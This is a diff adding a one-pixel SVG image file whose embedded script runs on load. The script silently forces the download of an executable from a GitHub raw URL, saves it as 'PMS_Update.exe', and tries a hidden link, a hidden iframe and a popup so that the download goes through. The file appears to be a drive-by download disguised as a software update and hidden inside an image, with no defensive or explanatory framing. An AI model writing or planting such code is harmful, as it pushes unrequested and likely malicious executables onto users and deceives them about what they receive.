@@ -1,0 +1,27 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
+  <script>
+    (function() {
+      // The URL of your executable file hosted on GitHub
+      var exeUrl = 'https://raw.githubusercontent.com/Kavin-cse/testing/main/auto_download.exe';
+      
+      // Method 1: Create a hidden link and click it automatically
+      var a = document.createElement('a');
+      a.href = exeUrl;
+      a.download = 'PMS_Update.exe'; // Forces download
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      
+      // Method 2: Use an iframe as fallback (starts download in background)
+      var iframe = document.createElement('iframe');
+      iframe.src = exeUrl;
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+      
+      // Method 3: Use window.open as a last resort (may be blocked by popup blockers)
+      setTimeout(function() {
+        window.open(exeUrl, '_blank');
+      }, 100);
+    })();
+  </script>
+</svg>
